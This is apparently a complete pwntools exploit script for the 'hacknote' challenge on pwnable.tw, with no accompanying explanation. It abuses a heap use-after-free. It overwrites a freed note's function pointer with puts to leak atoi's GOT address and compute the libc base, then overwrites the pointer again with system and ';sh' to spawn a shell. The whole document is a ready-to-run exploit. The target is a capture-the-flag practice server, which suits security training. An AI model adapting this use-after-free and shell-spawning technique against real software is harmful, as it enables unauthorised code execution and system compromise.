from pwn import *
context.log_level = "debug"

#r = process("./hacknote")
r = remote("chall.pwnable.tw", 10102)
elf = ELF("./hacknote")
libc = ELF("./libc_32.so.6")

def add(size, data):
    r.sendafter("choice :", "1")
    r.sendafter("size :", str(size))
    r.sendafter("Content :", data)

def dele(index):
    r.sendafter("choice :", "2")
    r.sendafter("Index :", str(index))

def show(index):
    r.sendafter("choice :", "3")
    r.sendafter("Index :", str(index))

#print r.pid
pause()

puts_func = 0x0804862B

add(40, 'a')
add(40, 'b')
dele(0)
dele(1)
add(8, p32(puts_func) + p32(elf.got['atoi']))
show(0)
a = u32(r.recv(4)) - 0x2d050
libc.address = a
success("libc:  " + hex(a))

dele(2)
add(8, p32(libc.sym['system']) + ";sh\x00")
show(0)


r.interactive()
